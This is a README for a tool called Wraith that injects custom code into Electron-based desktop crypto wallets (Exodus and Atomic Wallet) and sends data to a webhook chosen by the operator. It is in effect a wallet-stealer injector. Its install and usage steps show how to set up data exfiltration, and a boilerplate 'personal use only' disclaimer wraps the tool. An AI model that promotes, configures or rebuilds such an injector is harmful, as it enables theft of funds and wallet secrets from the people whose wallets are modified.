# Wraith injection

This project is a code injector for desktop wallets using electron. It allows you to modify specific files within the crypto wallet applications by injecting custom code snippets. If injection does not work please specify [here](https://github.com/opsec-bot/exodus-injection/issues).

## Prerequisites

Before using this code injector, ensure that you have the following installed on your system:

- Node.js
- npm (Node Package Manager)

## Installation

1. Clone the repository:

`git clone https://github.com/opsec-bot/wraith`

2. Navigate to the project directory:

`cd wraith`

3. Install the dependencies:

`npm install`

## Usage

1. Open the `app/index.js` file in your preferred code editor.

2. Modify the `hook` variable to specify the webhook URL where the injected code will send data.

3. Save the `app/index.js` file.

4. Open a terminal or command prompt and navigate to the project directory.

5. Run the injector:

`node app/index.js`

## Usage and Distribution Notice

This code injector is intended for personal use . The injector is not meant to be distributed or used for malicious purposes, including but not limited to malware distribution.

By using this code injector, you agree to use it responsibly and in compliance with all applicable laws and regulations. You should not use this code injector on applications or systems without obtaining proper permission or authorization.

The author (opsec-bot) emphasizes that any unauthorized use of this code injector for malicious activities is strictly prohibited. The author is not responsible for any misuse or illegal activities conducted with this injector.

Use this injector at your own risk and in accordance with ethical guidelines and laws governing software modification and usage.

## Currently supported wallets:

- [Exodus](https://www.exodus.com/) (Version: 23.6.19)
- [Atomic Wallet](https://atomicwallet.io/) (Version: Unknown)

